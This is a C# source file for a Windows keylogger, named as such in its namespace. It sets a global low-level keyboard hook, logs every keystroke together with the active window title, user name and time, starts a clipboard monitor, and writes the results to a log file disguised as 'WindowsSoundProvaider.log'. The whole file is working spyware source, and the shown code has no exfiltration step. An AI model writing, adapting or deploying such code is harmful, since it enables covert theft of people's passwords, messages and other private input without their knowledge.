using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Clipboard;

namespace KeyLogger
{
    internal sealed class Logger
    {
        private enum HookType : byte
        {
            WH_JOURNALRECORD = 0,
            WH_JOURNALPLAYBACK = 1,
            WH_KEYBOARD = 2,
            WH_GETMESSAGE = 3,
            WH_CALLWNDPROC = 4,
            WH_CBT = 5,
            WH_SYSMSGFILTER = 6,
            WH_MOUSE = 7,
            WH_HARDWARE = 8,
            WH_DEBUG = 9,
            WH_SHELL = 10,
            WH_FOREGROUNDIDLE = 11,
            WH_CALLWNDPROCRET = 12,
            WH_KEYBOARD_LL = 13,
            WH_MOUSE_LL = 14
        }

        public static string LogName = Path.Combine(Environment.CurrentDirectory,
            "WindowsSoundProvaider.log");

        public static string LastTitle = "";
        public static string UserName = WindowsIdentity.GetCurrent().Name;


        [DllImport("kernel32.dll")]
        public static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("user32.dll", SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(HookType hookType, HookProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll")]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool PeekMessage(IntPtr lpMsg, IntPtr hWnd, uint wMsgFilterMin, uint wMsgFilterMax,
            uint wRemoveMsg);

        [DllImport("user32.dll")]
        private static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);

        private static IntPtr Logging(int code, IntPtr wParam, IntPtr lParam)
        {
            var msgType = wParam.ToInt32();
            if (code >= 0 && (msgType == 0x100 || msgType == 0x104))
            {
                var key = KeyParser.ParseKey(lParam);
                var hWindow = GetForegroundWindow();
                var title = new StringBuilder();
                GetWindowText(hWindow, title, title.Capacity);

                if (title.ToString() != LastTitle)
                {
                    var titleString =
                        "====================================LOG RECORD START====================================" +
                        Environment.NewLine +
                        "User    : " + UserName + Environment.NewLine +
                        "Window  : " + title + Environment.NewLine +
                        "Time    : " + DateTime.Now + Environment.NewLine +
                        "LogFile : " + LogName + Environment.NewLine +
                        "----------------------------------------------" + Environment.NewLine +
                        "Log data: \r\n";
                    Trace.WriteLine("");
                    Trace.WriteLine(titleString);
                    Trace.WriteLine("");
                    GC.Collect();
                    LastTitle = title.ToString();
                }

                Trace.Write(key);
            }

            return CallNextHookEx(IntPtr.Zero, code, wParam, lParam);
        }

        public static void StartLoggers(string[] args)
        {
            try
            {
                Trace.Listeners.Clear();
                var twtl = new TextWriterTraceListener(LogName)
                {
                    Name = "", TraceOutputOptions = TraceOptions.ThreadId | TraceOptions.DateTime
                };

                var ctl = new ConsoleTraceListener(false) {TraceOutputOptions = TraceOptions.DateTime};

                Trace.Listeners.Add(twtl);
                Trace.Listeners.Add(ctl);
                Trace.AutoFlush = true;


                var clipboardT = new Thread(() =>
                    Application.Run(new ClipboardNotification.NotificationForm()));
                clipboardT.Start();

                HookProc callback = Logging;
                var processModule = Process.GetCurrentProcess().MainModule;
                if (processModule != null)
                {
                    var module = processModule.ModuleName;
                    var moduleHandle = GetModuleHandle(module);
                    SetWindowsHookEx(HookType.WH_KEYBOARD_LL, callback, moduleHandle, 0);
                }

                while (true)
                {
                    PeekMessage(IntPtr.Zero, IntPtr.Zero, 0x100, 0x109, 0);
                    Thread.Sleep(10);
                }
            }
            catch
            {
            }
        }


        private delegate IntPtr HookProc(int code, IntPtr wParam, IntPtr lParam);
    }
}